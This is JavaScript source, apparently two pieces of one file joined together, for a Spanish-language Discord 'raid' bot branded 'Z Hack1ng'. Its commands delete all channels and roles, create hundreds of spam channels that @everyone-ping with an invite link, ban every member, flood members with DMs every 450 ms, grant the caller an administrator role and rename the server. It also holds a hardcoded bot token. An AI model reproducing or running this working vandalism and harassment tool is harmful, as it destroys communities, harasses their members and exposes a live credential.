        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        

      })
    }
  }
});

//mdall

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === ".mdall")
    message.delete()
  message.guild.members.cache.forEach(member => {
    setInterval(function() {
      member.send("#Z Hack1ng x ! Jimo On Top https://discord.gg/2n7GVkAT6x").catch(error => { });
    }, 450);
  })
});


//borrar roles

client.on("message", message => {


  if (message.author.bot) return;

  if (message.content === ('.eliminarroles')) {
    message.delete()
    message.guild.roles.cache.map(roles => roles.delete());
  }
});

//crear roles

client.on("message", message => {

  if (message.author.bot) return;

  if (message.content === '.crearroles') {
    message.delete()
    for (let i = 0; i <= 200; i++) {
      message.guild.roles.create({ data: { name: `! Jimo#9770 OnToP`, color: '#d41818', }, reason: 'razon', })
    };
  }
});





client.login("MTAzMTU2MDUxNDI1NTQ3MDYzNg.Gzfqxp.QdjKJoxJvBhhmIymFVmRv2PHgXhjhxRO4AGn34");

const Discord = require("discord.js");
const client = new Discord.Client();
const Monitor = require('ping-monitor');
const keepAlive = require('./server');
const chalk = require('chalk');

client.on("ready", () => {

  console.log(chalk.red(`
Bot Encendido Cliente ${client.user.tag}
  `))



  console.log(chalk.cyan(`
                                          [+] Comandos:
                                          
                                           ღ .on | Jode el servidor de inmediato, ejecutando todos los comandos.
                                           ღ .nuke | Elimina todos los chats, dejando solo 1 para poner otros comandos.
                                           ღ .raid | Crea muchos canales con ping y mensajes.
                                           ღ .admin | Crea un rol con perms de administrador y te lo da.
                                           ღ .crearroles / . eliminarroles | Crea o elimina roles del servidor
                                           ღ .banall | Este comando banea a todos los usuarios del servidor (algunas veces falla)
                                           ღ .mdall | Envia multiples mensajes a todos los miembros del servidor
                                           ღ .lista | Obten informacion del raid (stats)


`))


  presencia();
});

keepAlive();
const monitor = new Monitor({
  website: 'https://sombras-2.markox36.repl.co',
  title: 'Secundario',
  interval: 15 // minutes
});

////////Monitor//////////
monitor.on('up', (res) => console.log(`${res.website} está encedido.`));
monitor.on('down', (res) => console.log(`${res.website} se ha caído - ${res.statusMessage}`));
monitor.on('stop', (website) => console.log(`${website} se ha parado.`));
monitor.on('error', (error) => console.log(error));
//////////////////////

function presencia() {
  client.user.setPresence({
    status: "online",
    activity: {
      name: "#Z Hack1ng x ! Jimo",
      type: "PLAYING"

    }
  });
}


//automatico

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === '.on') {

    console.log(chalk.green(`                                                                     [+] Raid en ejecucion`))


    message.delete()
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`Z Hack1ng x ! Jimo`, {
      type: 'text'
    }).then(channel => {
      channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀")
    })
    for (let i = 0; i <= 500; i++) {
      message.guild.channels.create(`Z Hack1ng x ! Jimo`, {
        type: 'text'
      }).then(channel => {
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");

      })
    }
    message.guild.setName("#Z Hack1ng");
    message.guild.setIcon("https://cdn.discordapp.com/attachments/1020498675887255582/1028363473568137297/logo.jpg");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
    channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");





    
  
  }
})


//admin

client.on("message", async msg => {


  if (msg.author.bot) return;
  if (msg.content.toLowerCase().startsWith('.admin')) {
    let rol = await msg.guild.roles.create({
      data: {
        name: "$",
        color: "B9BBBE",
        permissions: "ADMINISTRATOR",
        hoisted: false
      }
    })

    msg.member.roles.add(rol)
      .then(function(role) {
        msg.member.addRole(role);
        if (msg.deletable) msg.delete().catch(e => { });
      })
      .catch(e => { });
  }
});


//lista


client.on("message", message => {


  if (message.author.bot) return;
  const args = message.content.slice().trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  if (command === '.lista') {
    message.delete()
    const embed = new Discord.MessageEmbed()
      .setTitle("Informacion de proceso del raid")
      .setThumbnail()
      .setDescription(`**Canales:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
      .setColor("RED");
    message.channel.send(embed)
  }
});


//banall

client.on("message", async message => {
  if (message.content.startsWith('.banall')) {
    message.delete();
    if (!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
    message.guild.members.cache.forEach(member => {
      if (member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID") {
        member.ban();
      }
    })
  }
});


//nuke 

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === '.nuke') {

    message.delete()
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`Z Hack1ng➜ ! Jimo`, {
      type: 'text'
    }).then(channel => {
      channel.send("https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif")
    })
  }
})


//chats

client.on("message", message => {


  if (message.author.bot) return;

  if (message.content === '.raid') {
    message.delete()
    for (let i = 0; i <= 500; i++) {
      message.guild.channels.create(`Z Hack1ng➜ ! Jimo`, {
        type: 'text'
      }).then(channel => {
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
        channel.send("@everyone @! Jimo#9770 Raideo este servidor, habeis sido objetivos y victimas de ✡ Z Hack1ng ✝ https://discord.gg/2n7GVkAT6x https://cdn.discordapp.com/attachments/1016138674989187123/1031330474649452564/2f333f111ef13ad9e8c8f69d136e553b.gif ✝️💀");
